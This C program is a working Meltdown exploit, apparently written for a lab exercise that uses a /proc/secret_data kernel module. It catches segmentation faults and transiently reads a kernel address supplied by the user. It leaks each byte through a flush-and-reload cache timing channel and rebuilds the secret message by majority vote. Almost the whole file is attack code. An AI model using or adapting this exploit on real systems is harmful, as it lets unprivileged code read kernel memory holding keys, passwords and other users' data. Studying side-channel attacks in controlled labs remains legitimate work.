#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <fcntl.h>
#include <emmintrin.h>
#include <x86intrin.h>

#define CACHE_HIT_TIME (250)
#define OFFSET 2048

static sigjmp_buf jbuf;

static void stop_handle()
{
   siglongjmp(jbuf, 1);
}

int main(){

    signal(SIGSEGV, stop_handle);
    // SIGSEGV is set when an invaild memory access is detected
    // change the exception handler so it won't terminate the process

    unsigned char array[256 * 4096];

    int length;
    long long address;
    printf("input length of secret message: ");
    scanf("%d", &length); 
    printf("input starting address of secret message\n");
    printf("(in 64-bit hex): ");
    scanf("%llx", &address); 

    char message[length + 1];
    message[length] = '\0';
    int fp;
    int sig;
    char data;
    int temp = 0;
    unsigned char *addr;
    unsigned long int basetime;
    unsigned long int mtime;
    int max;
    int bytec;

    int counter[256];

    for(bytec = 0; bytec < length; bytec ++){ // length bytes in total need to be read

        if((fp = open("/proc/secret_data", O_RDONLY)) < 0)
            return -1;
        
        memset(counter, 0, sizeof(counter));

        // clear cache
        for(int i = 0; i < 256; i ++) array[i * 4096 + OFFSET] = 1;
        for(int i = 0; i < 256; i ++) _mm_clflush(&array[i * 4096 + OFFSET]);

        for(int i = 0; i < 500; i ++){ // for every byte, try 500 times to increase possibility of success
            if((sig = pread(fp, NULL, 0, 0)) < 0) // put secret data in cache
                return -1;
             
            // clear cache
            for(int j = 0; j < 256; j ++) _mm_clflush(&array[j * 4096 + OFFSET]);

            if(sigsetjmp(jbuf, 1) == 0){
                asm volatile(
                    ".rept 400;"            
                    "add $0x141, %%eax;"
                    ".endr;"                    
                
                    :
                    :
                    : "eax"
                ); //magic

                data = *(char *)(address + bytec); // exception!
                array[data * 4096 + OFFSET] = 1;
            }

            for(int i = 0;i < 256;++ i){        // measure access time
                addr = &array[i * 4096 + OFFSET];
                basetime = __rdtscp(&temp);
                temp = *addr;
                mtime = __rdtscp(&temp) - basetime;
                if(mtime < CACHE_HIT_TIME)
                    counter[i] ++;              // counter tracks cache hit times
            }

        }

        max = 0;
        for(int i = 1; i < 256; i ++){          // find value with biggest counter
            if(counter[i] > counter[max])
                max = i;
        }

        message[bytec] = max;

    }

    printf("secret message: %s\n", message);

    return 0;

}